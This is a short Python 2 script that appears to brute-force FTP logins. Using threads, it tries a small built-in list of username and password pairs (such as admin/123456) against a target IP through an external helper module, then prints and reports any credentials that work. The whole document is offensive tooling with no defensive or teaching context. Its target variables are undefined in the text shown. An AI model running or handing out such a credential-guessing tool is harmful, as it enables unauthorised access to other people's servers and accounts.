def crack_ftp(password):
	status=fuck.ftpscan(test_ip,password)
	if status == 1:
		fuck.report('ftp','%s %s'%(test_url,password))
		print '%s %s'%(test_url,password)
print 'start'
dic_list=['admin|123','admin|123456','x|123456']
fuck.thread(crack_ftp,dic_list,len(dic_list))
print 'end'
